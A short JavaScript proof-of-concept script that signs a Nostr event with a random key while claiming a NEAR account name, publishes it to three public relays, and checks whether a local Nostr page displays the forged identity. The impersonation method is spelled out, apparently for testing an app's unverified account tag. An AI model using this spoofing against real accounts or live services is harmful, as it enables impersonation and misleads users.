import { SimplePool } from "nostr-tools/pool";
import { finalizeEvent, generateSecretKey, getPublicKey } from "nostr-tools/pure";

const account = process.argv[2] ?? "buidlguidl.near";
const target = process.argv[3] ?? "project:test-nostr-page";
const relays = ["wss://relay.damus.io", "wss://nos.lol", "wss://relay.primal.net"];

const sk = generateSecretKey();
const pubkey = getPublicKey(sk);

const tags = [
  ["t", "project"],
  ["t", "nostr.nearbuilders.org"],
  ["p", pubkey],
  ["client", "nostr.nearbuilders.org"],
  ["near_target", target],
  ["near_account", account],
];

const event = finalizeEvent(
  { kind: 1111, created_at: Math.floor(Date.now() / 1000), tags, content: `spoof test as ${account}` },
  sk,
);

const p = new SimplePool();
const results = p.publish(relays, event);
const statuses = [];
await Promise.allSettled(
  results.map(async (pr, i) => {
    try {
      await pr;
      statuses.push([relays[i], "OK"]);
    } catch (e) {
      statuses.push([relays[i], "REJECTED: " + (e?.message ?? e)]);
    }
  }),
);

console.log("\nSpoofed event signed by a fresh random key (no NEAR wallet involved):");
console.log(`  claimed near_account: ${account}`);
console.log(`  actual signer pubkey:  ${pubkey}`);
console.log(`  event id:              ${event.id}\n`);
for (const [r, s] of statuses) console.log(`  ${r}: ${s}`);
console.log(
  `\nNow hard-refresh http://localhost:3000/nostr and look for "${account}" under a pubkey you've never used.`,
);
p.close(relays);
